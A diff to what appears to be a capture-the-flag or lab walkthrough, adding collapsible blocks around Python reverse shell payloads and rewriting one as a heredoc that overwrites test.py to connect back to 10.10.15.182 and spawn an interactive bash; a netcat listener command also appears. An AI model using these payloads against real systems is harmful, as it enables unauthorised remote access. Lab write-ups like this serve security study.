@@ -104,9 +104,14 @@ nc -lvnp 4444
 
 A Python reverse shell was then executed through the webshell:
 
+<details>
+<summary>Python Reverse Shell Payload</summary>
+
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.182",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
 ```
+
+</details>
 
 This resulted in an interactive reverse shell running as the www-data user.
 
@@ -199,8 +204,17 @@ The `test.py` script was then overwritten with a Python reverse shell payload:
 <summary>Python Reverse Shell Payload</summary>
 
 ```bash
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.182",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
+cat > test.py << 'EOF'
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.15.182",5555))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+EOF
 ```
+
 
 </details>
 
